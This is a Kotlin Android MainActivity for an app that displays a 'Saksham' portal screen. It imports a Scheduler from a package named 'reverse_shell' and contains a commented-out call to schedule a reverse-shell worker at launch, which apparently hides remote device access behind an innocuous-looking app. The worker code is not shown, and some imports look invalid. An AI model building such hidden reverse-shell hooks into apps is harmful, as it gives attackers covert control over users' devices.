package com.ironclad.saksham.main

import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.annotation.RequiresApi
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.ui.Modifier
import androidx.compose.ui.focus.focusModifier
import androidx.work.impl.schedulers
import com.ironclad.saksham.reverse_shell.Scheduler
import com.ironclad.saksham.ui.screens.SakshamPortalScreen
import com.ironclad.saksham.ui.theme.SakshamTheme

class MainActivity : ComponentActivity() {
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            // Scheduler.scheduleReverseShellWorker(applicationContext)
            SakshamPortalScreen(modifier = Modifier.fillMaxSize())
        }
    }
}

